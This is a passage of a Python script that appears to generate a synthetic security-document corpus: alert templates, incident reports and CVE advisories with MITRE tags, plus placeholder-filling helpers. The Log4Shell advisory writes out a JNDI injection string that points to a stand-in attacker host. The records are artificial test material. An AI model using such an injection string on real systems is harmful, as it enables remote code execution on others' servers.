        "category": "network",
        "mitre_tactic": "exfiltration",
        "mitre_technique": "Exfiltration Over Web Service",
        "tags": ["exfiltration", "data-theft", "dlp", "cloud-upload", "insider-threat"],
        "ioc_types": ["ip", "domain"],
    },
    {
        "title": "RDP Brute Force Detected Against Server {host}",
        "description": "Alert: High volume of failed RDP authentication attempts detected against server {host} (3389/tcp). Source IP {attacker_ip} generated 847 failed logon attempts across 23 different usernames in 15 minutes. Attack pattern suggests use of an automated credential stuffing tool with a leaked credential database. Two successful authentications were observed with the account 'svc_backup', which may indicate compromise. Immediate investigation and account lockout recommended.",
        "severity": "high",
        "category": "identity",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Brute Force",
        "tags": ["brute-force", "rdp", "credential-stuffing", "remote-access"],
        "ioc_types": ["ip"],
    },
    {
        "title": "Lateral Movement: PsExec Execution from {src_host} to {dst_host}",
        "description": "Alert: PsExec remote execution detected from {src_host} to {dst_host}. The tool was used to remotely execute a batch script that disables Windows Defender, creates a local admin account, and deploys a remote access tool. Authentication used a domain admin credential (DA-{user}). This is consistent with post-compromise lateral movement by a threat actor who has obtained elevated credentials. The PsExec binary was renamed to 'svc_update.exe' to evade detection.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "lateral_movement",
        "mitre_technique": "Remote Services",
        "tags": ["lateral-movement", "psexec", "remote-execution", "credential-abuse"],
        "ioc_types": ["ip", "hash", "file_path"],
    },
    {
        "title": "Ransomware Encryption Activity Detected on File Server {host}",
        "description": "CRITICAL ALERT: Active ransomware encryption detected on file server {host}. Over 15,000 files modified with .lockbit3 extension in the past 3 minutes. Ransom note 'Restore-My-Files.txt' dropped in every directory. The ransomware process (ID: 4892) has been identified as LockBit 3.0 based on behavioral signatures and encryption patterns. Volume shadow copies have been deleted. The malware is spreading to mapped network drives. Immediate network isolation recommended. Encryption originated from process path C:\\Windows\\Temp\\update_svc.exe.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "execution",
        "mitre_technique": "Command and Scripting Interpreter",
        "tags": ["ransomware", "lockbit", "encryption", "file-server", "critical-incident"],
        "ioc_types": ["hash", "file_path"],
    },
    {
        "title": "DNS Tunneling Communication Detected from {host}",
        "description": "Network alert: DNS tunneling activity detected from {host}. The endpoint is generating anomalous DNS TXT queries to {tunnel_domain} at a rate of 120 queries/minute with encoded payload data in subdomain labels. Average subdomain length is 63 characters (max DNS label length), indicating data encoding. Total estimated data transfer via DNS: 2.3 MB over 4 hours. The pattern matches known dnscat2 tunneling signatures. The DNS queries are resolving through an external recursive resolver bypassing corporate DNS.",
        "severity": "high",
        "category": "network",
        "mitre_tactic": "command_and_control",
        "mitre_technique": "Protocol Tunneling",
        "tags": ["dns-tunneling", "covert-channel", "dnscat2", "data-exfiltration"],
        "ioc_types": ["domain", "ip"],
    },
    {
        "title": "Kubernetes RBAC Privilege Escalation Detected in Cluster {cluster}",
        "description": "Cloud security alert: A service account in namespace 'staging' has created a ClusterRoleBinding granting itself cluster-admin privileges in Kubernetes cluster {cluster}. The service account 'deploy-bot' was compromised through an SSRF vulnerability in the web application. The attacker subsequently listed secrets across all namespaces, accessed the etcd datastore, and deployed a cryptominer DaemonSet. Kubernetes audit logs show the escalation path from the initial SSRF to full cluster compromise.",
        "severity": "critical",
        "category": "cloud",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Access Token Manipulation",
        "tags": ["kubernetes", "rbac", "privilege-escalation", "cloud", "container-escape"],
        "ioc_types": ["ip"],
    },
    {
        "title": "Insider Threat: Bulk Download of Sensitive Documents by {user}",
        "description": "DLP alert: User {user} from the Engineering department downloaded 342 sensitive documents from the internal SharePoint site within a 20-minute window. The documents include architecture diagrams, API keys, infrastructure documentation, and customer database exports. This activity is 15x the user's normal download rate. The user's last performance review was flagged, and a resignation was submitted 3 days ago. Downloaded files were synced to a personal OneDrive account.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "collection",
        "mitre_technique": "Data from Network Shared Drive",
        "tags": ["insider-threat", "data-theft", "dlp", "exfiltration"],
        "ioc_types": ["email"],
    },
    {
        "title": "Zero-Day Exploit Attempt Against Exchange Server {host}",
        "description": "Critical alert: Potential zero-day exploitation attempt detected against Microsoft Exchange server {host}. Suspicious POST requests to /owa/auth/logon.aspx with abnormal serialized .NET object payloads indicative of deserialization attacks. The attack pattern does not match any known CVE signatures, suggesting a potential zero-day. Web server w3wp.exe subsequently spawned cmd.exe and attempted to write a webshell to C:\\inetpub\\wwwroot\\aspnet_client\\. Immediate patching and forensic analysis recommended.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["zero-day", "exchange", "webshell", "deserialization", "cve-exploit"],
        "ioc_types": ["ip", "hash", "url", "file_path"],
    },
    {
        "title": "AWS GuardDuty: S3 Bucket Exfiltration from Account {account}",
        "description": "AWS GuardDuty finding: Anomalous S3 API activity detected in account {account}. An IAM role assumed by an EC2 instance is performing bulk GetObject operations on an S3 bucket containing customer PII data. The API calls originate from an IP address associated with a known Tor exit node. Over 50,000 objects (12 GB) have been accessed in the past hour. The IAM role has overly permissive S3 policies that should be scoped to specific buckets. CloudTrail shows the EC2 instance was compromised through SSRF exploitation.",
        "severity": "critical",
        "category": "cloud",
        "mitre_tactic": "exfiltration",
        "mitre_technique": "Exfiltration Over Web Service",
        "tags": ["aws", "s3", "exfiltration", "guardduty", "data-theft", "cloud"],
        "ioc_types": ["ip"],
    },
]

# ------ Incident Summaries ------

INCIDENT_SUMMARIES = [
    {
        "title": "Incident Report: Ransomware Attack on Healthcare Organization",
        "description": "Post-incident report for a LockBit 3.0 ransomware attack that impacted a 500-bed hospital network. Initial access was achieved through a phishing email containing a trojanized PDF sent to the HR department. The attacker established persistence via scheduled tasks and Cobalt Strike beacons, conducted Active Directory reconnaissance using BloodHound and SharpHound over 72 hours, escalated privileges to Domain Admin via Kerberoasting, and deployed ransomware across 847 endpoints using Group Policy. Patient care systems, EHR databases, and PACS imaging systems were encrypted. Recovery took 18 days using offline backups. Total estimated cost: $8.2 million including ransom (not paid), recovery, legal, and patient diversion costs.",
        "severity": "critical",
        "category": "malware",
        "mitre_tactic": "execution",
        "mitre_technique": "Command and Scripting Interpreter",
        "tags": ["ransomware", "lockbit", "healthcare", "incident-report", "cobalt-strike", "kerberoasting"],
        "ioc_types": ["ip", "domain", "hash", "email"],
        "platform": "Windows",
    },
    {
        "title": "Incident Report: Nation-State Espionage Campaign Against Defense Contractor",
        "description": "Classified incident summary of a 14-month espionage campaign attributed to APT28 (Fancy Bear) against a defense contractor. Initial compromise through a watering hole attack on an industry conference website. The threat actor deployed custom implants using DLL side-loading in legitimate defense software, maintained persistence through Windows Management Instrumentation (WMI) event subscriptions, and exfiltrated 2.4 TB of classified engineering documents, satellite communications protocols, and weapons system specifications. C2 communications were tunneled through legitimate cloud services (Azure Blob Storage) using steganography in JPEG images. The campaign was discovered only after threat intelligence sharing with partner agencies.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "collection",
        "mitre_technique": "Data from Local System",
        "tags": ["apt", "apt28", "espionage", "defense", "nation-state", "watering-hole"],
        "ioc_types": ["ip", "domain", "hash"],
        "platform": "Windows",
    },
    {
        "title": "Incident Report: Supply Chain Compromise via CI/CD Pipeline",
        "description": "Post-mortem analysis of a supply chain attack targeting the organization's CI/CD pipeline. Attackers compromised a developer's GitHub personal access token through a malicious VS Code extension. Using this access, they modified a GitHub Actions workflow to inject a backdoor into the build process. The trojanized artifact was distributed to 340 downstream customers before detection. The backdoor created a reverse shell to attacker infrastructure and exfiltrated environment variables containing API keys and database credentials. Detection occurred when a customer's EDR flagged the unexpected network connection from the application binary.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Supply Chain Compromise",
        "tags": ["supply-chain", "ci-cd", "github", "backdoor", "developer-tooling"],
        "ioc_types": ["domain", "ip", "hash"],
        "platform": "Linux",
    },
    {
        "title": "Incident Report: Business Email Compromise Resulting in $2.3M Wire Fraud",
        "description": "Incident report on a business email compromise that resulted in $2.3 million in fraudulent wire transfers. The attacker compromised the CFO's Office 365 account through an adversary-in-the-middle phishing attack that captured the session token, bypassing MFA. Over 12 days, the attacker studied the CFO's communication patterns, then impersonated the CFO to instruct the accounts payable team to redirect vendor payments to attacker-controlled bank accounts in Hong Kong. Email forwarding rules were created to hide incoming emails about the legitimate vendor payments. Discovered when the real vendor inquired about overdue payments.",
        "severity": "critical",
        "category": "phishing",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Phishing",
        "tags": ["business-email-compromise", "wire-fraud", "mfa-bypass", "office365", "social-engineering"],
        "ioc_types": ["email", "domain", "ip"],
        "platform": "Windows",
    },
    {
        "title": "Incident Report: Cloud Infrastructure Takeover via Exposed Terraform State",
        "description": "Post-incident analysis of a complete cloud infrastructure compromise originating from an exposed Terraform state file in a public S3 bucket. The state file contained plaintext AWS access keys, database credentials, and internal service URLs. The attacker used the credentials to create new IAM users with administrator access, deployed cryptomining EC2 instances across 4 regions (estimated $47,000 in compute costs), accessed RDS databases containing customer PII (230,000 records), and established persistence through Lambda functions triggered by CloudWatch events. The exposed bucket was created by a developer for a proof-of-concept and was never decommissioned.",
        "severity": "critical",
        "category": "cloud",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Valid Accounts",
        "tags": ["cloud-misconfiguration", "terraform", "aws", "data-breach", "cryptominer"],
        "ioc_types": ["ip"],
        "platform": "AWS",
    },
    {
        "title": "Incident Report: Insider Threat Data Exfiltration by Departing Engineer",
        "description": "Investigation report on a data theft incident by a departing senior engineer who exfiltrated proprietary source code and trade secrets over a 30-day period before resignation. The engineer used a personal USB drive to copy 12 GB of repository data, uploaded architectural documents to a personal Google Drive, emailed customer lists to a personal email account, and took screenshots of internal dashboards. The activity was flagged by the DLP system but the alerts were not triaged for 2 weeks due to alert fatigue. The engineer was subsequently hired by a direct competitor. Legal action initiated under trade secret protection laws.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "exfiltration",
        "mitre_technique": "Exfiltration Over Alternative Protocol",
        "tags": ["insider-threat", "data-theft", "intellectual-property", "dlp", "usb"],
        "ioc_types": ["email"],
        "platform": "macOS",
    },
]

# ------ Vulnerability Advisories ------

VULNERABILITY_ADVISORIES = [
    {
        "title": "Critical: Palo Alto PAN-OS GlobalProtect Zero-Day (CVE-2024-3400)",
        "description": "Critical vulnerability advisory for CVE-2024-3400 affecting Palo Alto Networks PAN-OS GlobalProtect gateway. CVSS 10.0 command injection vulnerability allowing unauthenticated remote code execution through crafted HTTP requests to the GlobalProtect portal. Actively exploited in the wild by UTA0218 threat group since March 2024. Exploitation creates a reverse shell, deploys the UPSTYLE Python backdoor, and pivots into internal networks. Affects PAN-OS 10.2, 11.0, and 11.1 with GlobalProtect and device telemetry enabled. Immediate patching to PAN-OS hotfix releases is required. Apply Threat Prevention signature 95187 as interim mitigation.",
        "severity": "critical",
        "category": "network",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["zero-day", "cve-exploit", "palo-alto", "vpn", "remote-code-execution"],
        "ioc_types": ["ip", "domain", "hash"],
        "cve_id": "CVE-2024-3400",
        "cvss_score": 10.0,
        "platform": "Linux",
    },
    {
        "title": "Critical: Fortinet FortiOS SSL-VPN Heap Overflow (CVE-2024-21762)",
        "description": "Critical vulnerability advisory for CVE-2024-21762 in Fortinet FortiOS SSL-VPN. Out-of-bounds write vulnerability allows unauthenticated attackers to execute arbitrary code via specially crafted HTTP requests. CVSS 9.8. This vulnerability has been exploited by Chinese state-sponsored groups to deploy custom implants in government and critical infrastructure networks. Affected versions: FortiOS 7.4.0-7.4.2, 7.2.0-7.2.6, 7.0.0-7.0.13, 6.4.0-6.4.14, 6.2.0-6.2.15. Upgrade immediately. Disable SSL-VPN as workaround if patching is not immediately possible.",
        "severity": "critical",
        "category": "network",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["cve-exploit", "fortinet", "vpn", "heap-overflow", "remote-code-execution"],
        "ioc_types": ["ip"],
        "cve_id": "CVE-2024-21762",
        "cvss_score": 9.8,
        "platform": "Linux",
    },
    {
        "title": "Critical: ConnectWise ScreenConnect Authentication Bypass (CVE-2024-1709)",
        "description": "Critical authentication bypass vulnerability in ConnectWise ScreenConnect allowing unauthorized access to the setup wizard on already-configured instances. CVSS 10.0. Attackers exploit this to create administrative accounts and deploy remote access tools, ransomware, and cryptominers. The trivial exploitation (single HTTP request) led to mass exploitation within 24 hours of disclosure. Multiple ransomware affiliates including LockBit and Black Basta have incorporated this into their playbooks. All self-hosted ScreenConnect instances must be updated to version 23.9.8 or later immediately.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["cve-exploit", "authentication-bypass", "remote-access", "mass-exploitation"],
        "ioc_types": ["ip", "hash"],
        "cve_id": "CVE-2024-1709",
        "cvss_score": 10.0,
        "platform": "Windows",
    },
    {
        "title": "High: Linux Kernel Privilege Escalation via nftables (CVE-2023-32233)",
        "description": "High severity use-after-free vulnerability in the Linux kernel's nftables subsystem (Netfilter) allowing local privilege escalation from unprivileged user to root. CVSS 7.8. The vulnerability exists in the handling of anonymous sets when processing batch requests. A proof-of-concept exploit is publicly available and highly reliable. Affected kernels: 5.x through 6.3.1. Container escape is possible when nftables capabilities are available within the container. Apply kernel patches or restrict access to nftables using seccomp profiles.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Exploitation for Privilege Escalation",
        "tags": ["kernel-exploit", "linux", "privilege-escalation", "nftables", "container-escape"],
        "ioc_types": ["file_path"],
        "cve_id": "CVE-2023-32233",
        "cvss_score": 7.8,
        "platform": "Linux",
    },
    {
        "title": "Critical: Ivanti Connect Secure VPN Authentication Bypass (CVE-2023-46805)",
        "description": "Critical authentication bypass in Ivanti Connect Secure (formerly Pulse Secure) VPN appliances chained with command injection (CVE-2024-21887) for unauthenticated RCE. Actively exploited by UNC5221 (suspected Chinese nexus) since December 2023, targeting government agencies, defense contractors, and telecom providers. Attackers deploy LIGHTWIRE and WIREFIRE webshells for persistent access that survives device reboots and factory resets. Over 30,000 exposed instances identified globally. Ivanti's initial mitigation XML was bypassed. Perform factory reset before applying patches.",
        "severity": "critical",
        "category": "network",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["cve-exploit", "ivanti", "vpn", "authentication-bypass", "webshell", "apt"],
        "ioc_types": ["ip", "domain", "hash"],
        "cve_id": "CVE-2023-46805",
        "cvss_score": 8.2,
        "platform": "Linux",
    },
    {
        "title": "High: Atlassian Confluence Data Center RCE (CVE-2023-22515)",
        "description": "Critical broken access control vulnerability in Atlassian Confluence Data Center and Server allowing unauthenticated remote creation of administrator accounts. CVSS 9.8 (revised from initial 10.0). Exploited by Storm-0062 (suspected Chinese state actor) since September 2023 to compromise Confluence instances in government and technology organizations. Attackers create admin accounts, install malicious plugins for webshell access, and exfiltrate Confluence spaces containing sensitive documentation. Affects Confluence Data Center and Server 8.0.0 through 8.5.1.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["cve-exploit", "confluence", "atlassian", "remote-code-execution", "broken-access-control"],
        "ioc_types": ["ip", "url"],
        "cve_id": "CVE-2023-22515",
        "cvss_score": 9.8,
        "platform": "Linux",
    },
    {
        "title": "Critical: Citrix NetScaler ADC Buffer Overflow - CitrixBleed (CVE-2023-4966)",
        "description": "Critical information disclosure vulnerability in Citrix NetScaler ADC and NetScaler Gateway (CVE-2023-4966), dubbed 'CitrixBleed'. Allows unauthenticated attackers to extract session tokens from device memory, enabling session hijacking that bypasses authentication and MFA. CVSS 9.4. Massively exploited by LockBit, Medusa, and other ransomware groups. Exploitation is trivial: a single crafted HTTP request leaks valid session cookies. Over 20,000 instances were exposed at time of disclosure. Patching alone is insufficient; all active sessions must be terminated after updating.",
        "severity": "critical",
        "category": "network",
        "mitre_tactic": "credential_access",
        "mitre_technique": "Steal Web Session Cookie",
        "tags": ["cve-exploit", "citrix", "netscaler", "session-hijacking", "ransomware"],
        "ioc_types": ["ip"],
        "cve_id": "CVE-2023-4966",
        "cvss_score": 9.4,
        "platform": "Linux",
    },
    {
        "title": "Critical: Apache Log4j Remote Code Execution - Log4Shell (CVE-2021-44228)",
        "description": "Critical remote code execution vulnerability in Apache Log4j 2 logging library (CVE-2021-44228), known as Log4Shell. CVSS 10.0. Allows unauthenticated RCE through JNDI injection in logged strings. Affects virtually all Java applications using Log4j 2.0 through 2.14.1. Exploitation is trivial: ${jndi:ldap://attacker.com/payload} in any logged input triggers class loading from attacker-controlled LDAP/RMI servers. Used by nation-state APTs, ransomware groups, and cryptominers. Remains one of the most exploited vulnerabilities years after disclosure due to deep embedding in software supply chains.",
        "severity": "critical",
        "category": "endpoint",
        "mitre_tactic": "initial_access",
        "mitre_technique": "Exploit Public-Facing Application",
        "tags": ["log4shell", "cve-exploit", "java", "remote-code-execution", "supply-chain"],
        "ioc_types": ["ip", "domain", "url"],
        "cve_id": "CVE-2021-44228",
        "cvss_score": 10.0,
        "platform": "Linux",
    },
    {
        "title": "High: Windows Print Spooler Remote Code Execution - PrintNightmare (CVE-2021-34527)",
        "description": "Critical RCE and local privilege escalation vulnerability in the Windows Print Spooler service. Allows authenticated users to execute arbitrary code with SYSTEM privileges by installing malicious printer drivers via the AddPrinterDriverEx function. CVSS 8.8. Proof-of-concept was accidentally disclosed before patch availability. Exploited by ransomware operators (Vice Society, Magniber) and APT groups for privilege escalation during post-compromise. Affects all Windows versions. Disable Print Spooler service on systems that do not require printing, especially domain controllers.",
        "severity": "high",
        "category": "endpoint",
        "mitre_tactic": "privilege_escalation",
        "mitre_technique": "Exploitation for Privilege Escalation",
        "tags": ["printnightmare", "cve-exploit", "windows", "print-spooler", "privilege-escalation"],
        "ioc_types": ["hash", "file_path"],
        "cve_id": "CVE-2021-34527",
        "cvss_score": 8.8,
        "platform": "Windows",
    },
    {
        "title": "Critical: OpenSSH regreSSHion Remote Code Execution (CVE-2024-6387)",
        "description": "Critical signal handler race condition in OpenSSH server (sshd) allowing unauthenticated remote code execution as root. CVSS 8.1. The vulnerability is a regression of CVE-2006-5051 reintroduced in OpenSSH 8.5p1. Exploitation requires approximately 10,000 connection attempts over 6-8 hours on 32-bit Linux systems with ASLR. 64-bit exploitation is theoretically possible but not yet demonstrated. Affects OpenSSH 8.5p1 through 9.7p1. The fix in OpenSSH 9.8p1 should be applied immediately. As a temporary workaround, set LoginGraceTime to 0 in sshd_config (warning: enables DoS risk).",
        "severity": "high",
        "category": "network",
        "mitre_tactic": "initial_access",
        "mitre_technique": "External Remote Services",
        "tags": ["openssh", "cve-exploit", "linux", "remote-code-execution", "race-condition"],
        "ioc_types": ["ip"],
        "cve_id": "CVE-2024-6387",
        "cvss_score": 8.1,
        "platform": "Linux",
    },
]

# ------ Additional generated documents to reach ~300 total ------

EXTRA_ALERTS = [
    ("Cobalt Strike Beacon Detected on {host}", "endpoint", "command_and_control", "Application Layer Protocol",
     "Endpoint alert: Cobalt Strike beacon process detected on {host}. The beacon is communicating over HTTPS to {c2_ip} with a beacon interval of 60 seconds and 25% jitter. Memory analysis reveals a reflectively loaded DLL injected into svchost.exe. The beacon supports lateral movement, credential harvesting, and file transfer modules. JA3 fingerprint matches known Cobalt Strike malleable C2 profile.",
     "critical", ["cobalt-strike", "beacon", "c2", "reflective-loading"], ["ip", "hash", "domain"]),

    ("Suspicious crontab Modification on Linux Server {host}", "endpoint", "persistence", "Scheduled Task/Job",
     "Alert: Unauthorized crontab modification detected on {host}. A new cron entry was added running every 5 minutes that executes a base64-encoded bash command downloading and executing a payload from {c2_ip}. The crontab was modified by the www-data user, suggesting web application compromise as the initial vector. The payload establishes a reverse shell and downloads XMRig cryptominer.",
     "high", ["persistence", "crontab", "cryptominer", "linux"], ["ip", "file_path"]),

    ("Golden Ticket Attack Detected in Active Directory", "identity", "credential_access", "OS Credential Dumping",
     "Critical identity alert: Indicators of a Golden Ticket attack detected. A Kerberos TGT with an unusually long lifetime (10 years) was used to authenticate to multiple domain controllers. The TGT was issued with the krbtgt account hash, indicating the attacker has obtained the KRBTGT password hash through DCSync or NTDS.dit extraction. All domain resources should be considered compromised. Full krbtgt password rotation (twice) is required for remediation.",
     "critical", ["golden-ticket", "kerberoasting", "active-directory", "credential-theft", "dcsync"], ["ip"]),

    ("Malicious Python Package in PyPI Repository", "endpoint", "initial_access", "Supply Chain Compromise",
     "Supply chain alert: A malicious Python package 'requests-toolkit' (typosquatting on 'requests') was identified in the PyPI repository and installed on developer workstation {host}. The package contains a post-install hook that exfiltrates SSH keys, AWS credentials, and environment variables to {c2_ip}. The package was downloaded 1,847 times before removal. All systems with the package installed must rotate credentials immediately.",
     "high", ["supply-chain", "typosquatting", "python", "developer-tooling"], ["domain", "hash", "ip"]),

    ("Azure AD Conditional Access Policy Bypass", "identity", "defense_evasion", "Impair Defenses",
     "Identity alert: Successful authentication detected that bypassed Azure AD Conditional Access policies requiring MFA and compliant device. The attacker used a stolen primary refresh token (PRT) obtained through a compromised Azure AD joined device to generate access tokens that satisfy device compliance checks. Sessions from IP {attacker_ip} show access to SharePoint, Teams, and Exchange Online without MFA challenge.",
     "high", ["azure-ad", "conditional-access", "mfa-bypass", "token-theft"], ["ip"]),

    ("Emotet Botnet C2 Communication Detected", "malware", "command_and_control", "Application Layer Protocol",
     "Network alert: Emotet botnet command-and-control communication detected from {host}. The infected endpoint is contacting known Emotet C2 servers at {c2_ip} over HTTPS port 443 and HTTP port 8080. Emotet is distributing secondary payloads including IcedID banking trojan and Cobalt Strike beacons. The initial infection vector was a thread-hijacked email containing a malicious Excel attachment with XLM macros.",
     "high", ["emotet", "botnet", "c2", "banking-trojan", "macro"], ["ip", "domain", "hash"]),

    ("Unauthorized S3 Bucket Public Access Modification", "cloud", "defense_evasion", "Impair Defenses",
     "AWS CloudTrail alert: The S3 bucket 'prod-customer-data' had its public access block configuration removed by IAM user 'dev-jenkins'. Subsequently, a bucket policy was applied granting s3:GetObject to principal '*', making all objects publicly accessible. The bucket contains 2.1 million customer records including PII. The API calls originated from IP {attacker_ip} which is not in the known CI/CD IP range.",
     "critical", ["aws", "s3", "cloud-misconfiguration", "data-exposure"], ["ip"]),

    ("BloodHound Active Directory Reconnaissance Detected", "identity", "discovery", "Account Discovery",
     "Alert: Active Directory enumeration consistent with BloodHound/SharpHound collection detected. User account {user} performed 4,327 LDAP queries in 3 minutes, enumerating group memberships, trust relationships, ACLs, and session data across all domain objects. This reconnaissance technique maps attack paths to high-value targets like Domain Admins. The querying pattern matches SharpHound's default collection method.",
     "high", ["bloodhound", "active-directory", "reconnaissance", "ldap-enumeration"], ["ip"]),

    ("Reverse Shell Connection Established from Web Server", "endpoint", "execution", "Command and Scripting Interpreter",
     "Critical endpoint alert: A reverse shell connection was established from web server {host} to external IP {c2_ip} on port 4444. The shell was spawned by the apache2 process through a PHP webshell uploaded to /var/www/html/wp-content/uploads/shell.php. The attacker has executed whoami, id, uname -a, and cat /etc/passwd commands. The WordPress site was compromised through a vulnerable plugin (CVE-2024-2879).",
     "critical", ["reverse-shell", "webshell", "wordpress", "php", "remote-code-execution"], ["ip", "file_path", "url"]),

    ("Credential Stuffing Attack Against OAuth Endpoint", "identity", "credential_access", "Brute Force",
     "Authentication alert: Large-scale credential stuffing attack detected against the OAuth2 /token endpoint. Over 50,000 authentication attempts from a botnet of 200+ IP addresses using leaked credentials from the RockYou2024 database. The attack rotates user-agent strings and uses residential proxies to evade rate limiting. 127 successful authentications identified that require immediate password resets and session revocation.",
     "high", ["credential-stuffing", "oauth", "brute-force", "botnet", "credential-theft"], ["ip"]),

    ("Fileless Malware via WMI Event Subscription Persistence", "endpoint", "persistence", "Boot or Logon Autostart Execution",
     "Endpoint alert: Fileless malware persistence established via WMI event subscription on {host}. An __EventFilter/__EventConsumer binding was created that executes an encoded PowerShell payload on system startup. The payload lives entirely in the WMI repository with no files written to disk. The PowerShell command decodes and executes a Cobalt Strike beacon stager in memory. This technique was identified in the WMI repository during proactive threat hunting.",
     "high", ["fileless", "wmi", "persistence", "cobalt-strike", "living-off-the-land"], ["hash"]),

    ("Suspicious OAuth Application Consent in Microsoft 365", "cloud", "initial_access", "Phishing",
     "Cloud alert: A malicious OAuth application 'Document Scanner Pro' was granted consent by user {user} in the Microsoft 365 tenant. The application requests Mail.Read, Mail.Send, Files.ReadWrite.All, and User.Read.All permissions. The consent was obtained through an illicit consent grant phishing attack where the user clicked a link in a phishing email. The application is now exfiltrating emails and OneDrive files to an external server.",
     "high", ["oauth", "consent-phishing", "microsoft-365", "cloud", "data-theft"], ["domain", "email"]),

    ("Memory-Only Malware Detected via ETW Analysis", "endpoint", "defense_evasion", "Obfuscated Files or Information",
     "Advanced threat detection: Memory-only malware identified through Event Tracing for Windows (ETW) behavioral analysis on {host}. The malware uses syscall-level API hooking to bypass all userland EDR hooks, performs AMSI bypass via memory patching, and loads a custom .NET assembly directly from memory. No files touch disk at any point. The payload was identified as a variant of the Brute Ratel C4 adversary simulation framework based on unique sleep obfuscation patterns.",
     "critical", ["fileless", "brute-ratel", "edr-bypass", "memory-only", "defense-evasion"], ["hash", "ip"]),

    ("Kubernetes Secret Exfiltration via Compromised Pod", "cloud", "credential_access", "Unsecured Credentials",
     "Kubernetes security alert: A compromised pod in namespace 'production' is accessing Kubernetes secrets across multiple namespaces. The pod 'webapp-frontend-7d9c4' has been observed calling the Kubernetes API to list and read secrets including database credentials, TLS certificates, and API keys. The pod was compromised through a Server-Side Request Forgery (SSRF) vulnerability that allowed access to the cloud metadata service and subsequent Kubernetes API authentication.",
     "critical", ["kubernetes", "secrets", "credential-theft", "ssrf", "cloud"], ["ip"]),

    ("Spearphishing with ISO File Attachment Bypassing MOTW", "phishing", "initial_access", "Phishing",
     "Email security alert: Targeted spearphishing campaign detected using .iso file attachments to bypass Mark of the Web (MOTW) protections. The ISO files contain a .lnk shortcut that executes a DLL via rundll32.exe when the user double-clicks. This technique evades SmartScreen warnings because files extracted from ISO images do not inherit the MOTW zone identifier. The campaign targets finance department employees with fake invoice lures and has been attributed to QakBot operators.",
     "high", ["phishing", "iso", "motw-bypass", "qakbot", "social-engineering"], ["hash", "email", "domain"]),
]

# ---------------------------------------------------------------------------
# Build documents
# ---------------------------------------------------------------------------

def make_host():
    prefixes = ["WS", "SRV", "DC", "EXCH", "WEB", "DB", "APP", "MAIL", "FILE", "VPN"]
    return f"{random.choice(prefixes)}-{random.randint(1001, 9999)}"

def make_user():
    firsts = ["jsmith", "agarcia", "mchen", "pjohnson", "kwilliams", "lbrown", "rdavis",
              "tmiller", "nwilson", "sthompson", "jlee", "kanderson", "dmartin"]
    return random.choice(firsts)

def make_cluster():
    return f"prod-{random.choice(['us-east-1', 'eu-west-1', 'ap-southeast-1'])}-{random.randint(1,5)}"

def make_account():
    return f"{random.randint(100000000000, 999999999999)}"

def expand_alert(template, doc_id):
    """Expand an alert template with random concrete values."""
    doc = dict(template)
    c2_ip = random.choice(IOC_POOLS["ip"])
    phish_domain = random.choice(IOC_POOLS["domain"])
    payload_url = random.choice(IOC_POOLS["url"])
    hash_val = random.choice(IOC_POOLS["hash"])
    cloud_services = ["Mega.nz", "Dropbox", "Google Drive", "AWS S3", "Azure Blob Storage"]

    replacements = {
        "{host}": make_host(),
        "{user}": make_user(),
        "{c2_ip}": c2_ip,
        "{phish_domain}": phish_domain,
        "{payload_url}": payload_url,
        "{hash}": hash_val,
        "{cloud_service}": random.choice(cloud_services),
        "{attacker_ip}": random.choice(IOC_POOLS["ip"]),
        "{src_host}": make_host(),
        "{dst_host}": make_host(),
        "{tunnel_domain}": random.choice(IOC_POOLS["domain"]),
        "{cluster}": make_cluster(),
        "{account}": make_account(),
    }

    for key, val in replacements.items():
        doc["title"] = doc["title"].replace(key, val)
        doc["description"] = doc["description"].replace(key, val)

    doc["source"] = "alert"
    doc["timestamp"] = _ts(60)
    return doc

def build_all_documents():
    docs = []
    doc_id = 1

    # Detection rules (25)
    for rule in DETECTION_RULES:
        d = dict(rule)
        d["source"] = "detection_rule"
        d["timestamp"] = _ts(180)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Threat intel reports (8)
    for report in THREAT_INTEL_REPORTS:
        d = dict(report)
        d["source"] = "threat_intel"
        d["timestamp"] = _ts(120)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Security alerts from templates (expanded with variations) - generate ~150
    for _ in range(150):
        template = random.choice(ALERT_TEMPLATES)
        d = expand_alert(template, doc_id)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Extra specific alerts (15)
    for extra in EXTRA_ALERTS:
        title_tmpl, category, tactic, technique, desc_tmpl, severity, tags, ioc_types = extra
        d = {
            "title": title_tmpl,
            "description": desc_tmpl,
            "severity": severity,
            "category": category,
            "mitre_tactic": tactic,
            "mitre_technique": technique,
            "tags": tags,
            "ioc_types": ioc_types,
            "source": "alert",
            "timestamp": _ts(60),
        }
        # Expand placeholders
        replacements = {
            "{host}": make_host(),
            "{user}": make_user(),
            "{c2_ip}": random.choice(IOC_POOLS["ip"]),
            "{attacker_ip}": random.choice(IOC_POOLS["ip"]),
        }
        for key, val in replacements.items():
            d["title"] = d["title"].replace(key, val)
            d["description"] = d["description"].replace(key, val)
        d["_id"] = str(doc_id)
        docs.append(d)
        doc_id += 1

    # Incident summaries (6)
